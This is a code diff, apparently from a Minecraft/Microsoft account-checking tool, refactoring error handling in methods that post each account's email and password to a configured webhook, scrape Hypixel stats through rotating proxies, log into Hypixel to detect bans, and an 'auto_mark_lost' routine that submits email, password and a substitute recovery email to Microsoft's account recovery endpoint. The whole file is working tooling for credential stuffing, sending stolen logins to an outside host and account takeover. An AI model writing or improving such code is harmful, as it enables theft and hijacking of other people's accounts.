@@ -200,6 +200,9 @@ class Capture:
     def notify(self):
         global errors
         try:
+            if not config.get('webhook'):
+                return
+                
             payload = {
                 "content": config.get('message')
                     .replace("<email>", self.email)
@@ -219,126 +222,75 @@ class Capture:
                     .replace("<lastchanged>", self.lastchanged or "N/A"),
                 "username": "Klyte"
             }
-            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"})
-        except: pass
             
-        try:
-            replacements = {
-                "<email>": self.email,
-                "<password>": self.password,
-                "<name>": self.name or "N/A",
-                "<hypixel>": self.hypixel or "N/A",
-                "<level>": self.level or "N/A",
-                "<firstlogin>": self.firstlogin or "N/A",
-                "<lastlogin>": self.lastlogin or "N/A",
-                "<ofcape>": self.cape or "N/A",
-                "<capes>": self.capes or "N/A",
-                "<access>": self.access or "N/A",
-                "<skyblockcoins>": self.sbcoins or "N/A",
-                "<bedwarsstars>": self.bwstars or "N/A",
-                "<banned>": self.banned or "Unknown",
-                "<namechange>": self.namechanged or "N/A",
-                "<lastchanged>": self.lastchanged or "N/A",
-                "<type>": self.type or "N/A"
-            }
-            
-            content = message_template
-            for placeholder, value in replacements.items():
-                content = content.replace(placeholder, value)
-                
-            payload = {
-                "content": content,
-                "username": "MCChecker"
-            }
-            
-            self.session.post(webhook_url, json=payload, timeout=CONNECTION_TIMEOUT)
+            try:
+                response = requests.post(
+                    config.get('webhook'), 
+                    data=json.dumps(payload), 
+                    headers={"Content-Type": "application/json"},
+                    timeout=CONNECTION_TIMEOUT
+                )
+                if response.status_code != 200:
+                    print(f"Webhook notification failed with status code: {response.status_code}")
+            except Exception as e:
+                print(f"Error sending webhook notification: {e}")
         except Exception as e:
-            pass
+            print(f"Error in notify method: {e}")
+            errors += 1
 
     def hypixel(self):
         global errors
         try:
             if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
-                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
-                try: 
-                    if config.get('hypixelname') is True: self.hypixel = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
-                except: pass
-                try: 
-                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
-                except: pass
-                try: 
-                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
-                except: pass
-                try: 
-                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
-                except: pass
-                try: 
-                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
-                except: pass
-            if config.get('hypixelsbcoins') is True:
                 try:
-                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False) #didnt use the api here because this is faster ¯\_(ツ)_/¯
-                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
-                except: pass
-        except: errors+=1
-
-        try:
-            for _ in range(3):  
-                try:
-                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
-                    response = self.session.get(
-                        f'https://plancke.io/hypixel/player/stats/{self.name}',
-                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'},
-                        timeout=CONNECTION_TIMEOUT
-                    )
+                    tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=proxy_manager.get_proxy(config.get('proxytype')), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False, timeout=CONNECTION_TIMEOUT).text
                     
-                    if response.status_code == 200:
-                        tx = response.text
-                        break
-                except Exception:
-                    continue
-            else:
-                return  
-                
-            
-            if config.get('hypixelname') is True:
-                try: 
-                    self.hypixel = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
-                except: pass
-                
-            if config.get('hypixellevel') is True:
-                try: 
-                    self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
-                except: pass
-                
-            if config.get('hypixelfirstlogin') is True:
-                try: 
-                    self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
-                except: pass
-                
-            if config.get('hypixellastlogin') is True:
-                try: 
-                    self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
-                except: pass
-                
-            if config.get('hypixelbwstars') is True:
-                try: 
-                    self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
-                except: pass
-
-            
+                    if config.get('hypixelname') is True:
+                        try: 
+                            self.hypixel = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
+                        except: 
+                            self.hypixel = "Unknown"
+                            
+                    if config.get('hypixellevel') is True:
+                        try: 
+                            self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
+                        except: 
+                            self.level = "Unknown"
+                            
+                    if config.get('hypixelfirstlogin') is True:
+                        try: 
+                            self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
+                        except: 
+                            self.firstlogin = "Unknown"
+                            
+                    if config.get('hypixellastlogin') is True:
+                        try: 
+                            self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
+                        except: 
+                            self.lastlogin = "Unknown"
+                            
+                    if config.get('hypixelbwstars') is True:
+                        try: 
+                            self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
+                        except: 
+                            self.bwstars = "Unknown"
+                except Exception as e:
+                    print(f"Error fetching Hypixel data: {e}")
+                    
             if config.get('hypixelsbcoins') is True:
                 try:
-                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
-                    req = self.session.get(
-                        f"https://sky.shiiyu.moe/stats/{self.name}", 
-                        timeout=CONNECTION_TIMEOUT
-                    )
+                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=proxy_manager.get_proxy(config.get('proxytype')), verify=False, timeout=CONNECTION_TIMEOUT)
                     if req.status_code == 200:
-                        self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
-                except: pass
+                        try:
+                            self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
+                        except:
+                            self.sbcoins = "Unknown"
+                except Exception as e:
+                    print(f"Error fetching Skyblock data: {e}")
+                    self.sbcoins = "Unknown"
         except Exception as e:
-            pass
+            print(f"Error in hypixel check: {e}")
+            errors += 1
 
     def check_optifine_cape(self):
         if not config.get('optifinecape'):
@@ -347,22 +299,24 @@ class Capture:
         try:
             for _ in range(2):  
                 try:
-                    self.session.proxies = proxy_manager.get_proxy(config.get('proxytype'))
-                    response = self.session.get(
+                    response = requests.get(
                         f'http://s.optifine.net/capes/{self.name}.png',
+                        proxies=proxy_manager.get_proxy(config.get('proxytype')),
                         timeout=CONNECTION_TIMEOUT
                     )
                     
-                    if "Not found" in response.text: 
-                        self.cape = "No"
-                    else: 
+                    if response.status_code == 200:
                         self.cape = "Yes"
+                    else:
+                        self.cape = "No"
                     break
-                except:
+                except Exception as e:
+                    print(f"Error checking Optifine cape: {e}")
                     continue
             else:
                 self.cape = "Unknown"
-        except:
+        except Exception as e:
+            print(f"Error in Optifine cape check: {e}")
             self.cape = "Unknown"
 
     def full_access(self):
@@ -440,85 +394,97 @@ class Capture:
         
         for attempt in range(max_retries):
             try:
-                
                 proxy = proxy_manager.get_ban_proxy()
                 if proxy:
-                    if '@' in proxy:
-                        auth, ip_port = proxy.split('@')
-                        username, password = auth.split(':')
-                        host, port = ip_port.split(':')
-                        socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port), username=username, password=password)
-                    else:
-                        host, port = proxy.split(':')
-                        socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port))
-                    socket.socket = socks.socksocket
-                
-                
-                connection = Connection(
-                    "alpha.hypixel.net", 25565, 
-                    auth_token=auth_token, 
-                    initial_version=47, 
-                    allowed_versions={"1.8", 47}
-                )
-                
-               
-                original_stderr = sys.stderr
-                sys.stderr = StringIO()
-                
-                event = threading.Event()
-                
-                @connection.listener(clientbound.login.DisconnectPacket, early=True)
-                def login_disconnect(packet):
-                    data = json.loads(str(packet.json_data))
-                    if "Suspicious activity" in str(data):
-                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
-                    elif "temporarily banned" in str(data):
-                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
-                    elif "You are permanently banned from this server!" in str(data):
-                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
-                    elif "The Hypixel Alpha server is currently closed!" in str(data):
-                        self.banned = "False"
-                    elif "Failed cloning your SkyBlock data" in str(data):
-                        self.banned = "False"
-                    else:
-                        self.banned = ''.join(item["text"] for item in data["extra"])
-                    event.set()
-
-                @connection.listener(clientbound.play.JoinGamePacket, early=True)
-                def joined_server(packet):
-                    self.banned = "False"
-                    event.set()
-                
+                    try:
+                        if '@' in proxy:
+                            auth, ip_port = proxy.split('@')
+                            username, password = auth.split(':')
+                            host, port = ip_port.split(':')
+                            socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port), username=username, password=password)
+                        else:
+                            host, port = proxy.split(':')
+                            socks.set_default_proxy(socks.SOCKS5, addr=host, port=int(port))
+                        socket.socket = socks.socksocket
+                    except Exception as e:
+                        print(f"Error setting up proxy: {e}")
+                        continue
                 
                 try:
-                    connection_thread = threading.Thread(target=connection.connect)
-                    connection_thread.daemon = True
-                    connection_thread.start()
+                    connection = Connection(
+                        "alpha.hypixel.net", 25565, 
+                        auth_token=auth_token, 
+                        initial_version=47, 
+                        allowed_versions={"1.8", 47}
+                    )
                     
-                    # wait timeout
-                    if event.wait(5):  # 5 second
-                        connection.disconnect()
-                        if self.banned is not None:
-                            break
-                    else:
-                        # timeout RIP
-                        connection.disconnect()
-                except:
-                    pass
-                
-                
-                sys.stderr = original_stderr
-                
-                
-                if proxy:
-                    socket.socket = socket._real_socket
+                    original_stderr = sys.stderr
+                    sys.stderr = StringIO()
                     
-            except:
+                    event = threading.Event()
+                    
+                    @connection.listener(clientbound.login.DisconnectPacket, early=True)
+                    def login_disconnect(packet):
+                        try:
+                            data = json.loads(str(packet.json_data))
+                            if "Suspicious activity" in str(data):
+                                self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
+                            elif "temporarily banned" in str(data):
+                                self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
+                            elif "You are permanently banned from this server!" in str(data):
+                                self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
+                            elif "The Hypixel Alpha server is currently closed!" in str(data):
+                                self.banned = "False"
+                            elif "Failed cloning your SkyBlock data" in str(data):
+                                self.banned = "False"
+                            else:
+                                self.banned = ''.join(item["text"] for item in data["extra"])
+                        except Exception as e:
+                            print(f"Error processing ban status: {e}")
+                            self.banned = "Unknown"
+                        event.set()
+
+                    @connection.listener(clientbound.play.JoinGamePacket, early=True)
+                    def joined_server(packet):
+                        self.banned = "False"
+                        event.set()
+                    
+                    try:
+                        connection_thread = threading.Thread(target=connection.connect)
+                        connection_thread.daemon = True
+                        connection_thread.start()
+                        
+                        if event.wait(5):  # 5 second timeout
+                            connection.disconnect()
+                            if self.banned is not None:
+                                break
+                        else:
+                            connection.disconnect()
+                            self.banned = "Unknown"
+                    except Exception as e:
+                        print(f"Error in connection thread: {e}")
+                        self.banned = "Unknown"
+                    
+                except Exception as e:
+                    print(f"Error creating connection: {e}")
+                    self.banned = "Unknown"
+                finally:
+                    sys.stderr = original_stderr
+                    if proxy:
+                        try:
+                            socket.socket = socket._real_socket
+                        except:
+                            pass
+                    
+            except Exception as e:
+                print(f"Error in ban check attempt: {e}")
                 if proxy:
-                    socket.socket = socket._real_socket
+                    try:
+                        socket.socket = socket._real_socket
+                    except:
+                        pass
                 continue
         
-        # no status
         if self.banned is None:
             self.banned = "Unknown"
 
@@ -595,28 +561,27 @@ class AccountChecker:
         self.session = requests.Session()
         self.session.verify = False
     
-
-def auto_mark_lost(self, email, password, recovery_email):
-    try:
-        print(f"Marking lost: {email} -> {recovery_email}")
-        response = self.session.post(
-            "https://account.live.com/acsr",
-            data={
-                "EmailAddress": email,
-                "Password": password,
-                "RecoveryEmail": recovery_email,
-                "flag": "automarklost"
-            },
-            timeout=10
-        )
-        if response.status_code == 200:
-            print(f"[+] Marked as lost: {email}")
-            with open("results/MarkedLost.txt", "a") as f:
-                f.write(f"{email}:{password} -> {recovery_email}\n")
-        else:
-            print(f"[-] Failed to mark: {email} (status {response.status_code})")
-    except Exception as e:
-        print(f"[!] Exception marking lost: {email} - {e}")
+    def auto_mark_lost(self, email, password, recovery_email):
+        try:
+            print(f"Marking lost: {email} -> {recovery_email}")
+            response = self.session.post(
+                "https://account.live.com/acsr",
+                data={
+                    "EmailAddress": email,
+                    "Password": password,
+                    "RecoveryEmail": recovery_email,
+                    "flag": "automarklost"
+                },
+                timeout=10
+            )
+            if response.status_code == 200:
+                print(f"[+] Marked as lost: {email}")
+                with open("results/MarkedLost.txt", "a") as f:
+                    f.write(f"{email}:{password} -> {recovery_email}\n")
+            else:
+                print(f"[-] Failed to mark: {email} (status {response.status_code})")
+        except Exception as e:
+            print(f"[!] Exception marking lost: {email} - {e}")
 
     def get_authentication_url_and_tag(self):
         url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
